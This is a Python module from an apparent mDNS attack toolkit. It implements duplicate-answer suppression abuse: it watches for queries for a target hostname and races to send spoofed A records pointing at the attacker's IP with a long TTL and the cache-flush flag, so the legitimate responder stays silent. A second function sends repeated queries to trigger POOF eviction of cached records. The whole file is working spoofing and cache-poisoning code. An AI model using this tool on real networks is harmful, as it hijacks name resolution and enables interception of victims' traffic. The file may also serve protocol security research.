"""
suppress.py - Duplicate answer suppression abuse.

Silences legitimate responders by preemptively sending their answers with
attacker-controlled rdata. The legitimate responder sees "its answer" already
on the wire and suppresses its own response (RFC 6762 Section 7.4).

Combined with POOF triggering to evict records after suppression.
"""

import time
import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, recv_mdns, parse_packet,
                       build_response, build_query, rdata_a,
                       A, AAAA, PTR, SRV, ANY, IN, CACHE_FLUSH)


def suppress_and_replace(target_name: str, real_ip: str, our_ip: str,
                         iface: str | None = None, duration: int = 60):
    """
    When a query for target_name is seen, immediately respond with our_ip.

    The legitimate responder (real_ip) sees our answer and suppresses its own
    response per RFC 6762 Section 7.4. This works because the responder checks
    if an answer with the same name/rrtype/rrclass has already been sent --
    our answer satisfies this check even though the rdata differs, as long as
    our TTL >= the legitimate TTL.

    Note: This relies on the attacker's response arriving before the legitimate
    one. On most networks this is achievable due to the random 20-120ms jitter
    that responders add to their responses.
    """
    sock = make_mdns_socket(iface)
    target = target_name.lower().rstrip(".") + "."

    print(f"[*] Suppression attack: {target_name}")
    print(f"    Real:    {real_ip}")
    print(f"    Spoof:   {our_ip}")

    start = time.time()
    count = 0

    try:
        while time.time() - start < duration:
            result = recv_mdns(sock, timeout=0.5)
            if result is None:
                continue
            data, (src_ip, _) = result
            pkt = parse_packet(data)
            if not pkt or pkt["is_response"]:
                continue

            for q in pkt["questions"]:
                if q["name"].lower() == target and q["type_int"] in (A, AAAA, ANY):
                    # Race to respond before the legitimate host
                    resp = build_response(target_name, A, rdata_a(our_ip),
                                          ttl=4500, cache_flush=True)
                    send_mdns(sock, resp)
                    count += 1
                    print(f"  [{count}] Query from {src_ip} -> spoofed response sent")
    except KeyboardInterrupt:
        pass

    print(f"\n[*] Sent {count} suppression responses")
    sock.close()


def poof_evict(target_name: str, iface: str | None = None, count: int = 5,
               interval: float = 2.0):
    """
    Trigger POOF (Passive Observation of Failures) to evict a cached record.

    Send queries that should be answered by the target record. If we can prevent
    the legitimate answer (e.g., via suppression or the host being offline),
    observers will flush the record after 2+ unanswered observations.
    """
    sock = make_mdns_socket(iface)

    print(f"[*] POOF eviction: sending {count} unanswered queries for {target_name}")
    print(f"    Observers will flush cached record after 2+ unanswered queries")

    for i in range(count):
        query = build_query(target_name, A)
        send_mdns(sock, query)
        print(f"  [{i+1}/{count}] Query sent")
        time.sleep(interval)

    print(f"[*] POOF queries complete. If answers were suppressed, record should be evicted.")
    sock.close()


def run(target_name: str, our_ip: str, real_ip: str | None = None,
        iface: str | None = None, mode: str = "suppress", duration: int = 60):
    if mode == "suppress" and real_ip:
        suppress_and_replace(target_name, real_ip, our_ip, iface, duration)
    elif mode == "poof":
        poof_evict(target_name, iface)
    else:
        print("Modes: suppress (needs --real-ip), poof")
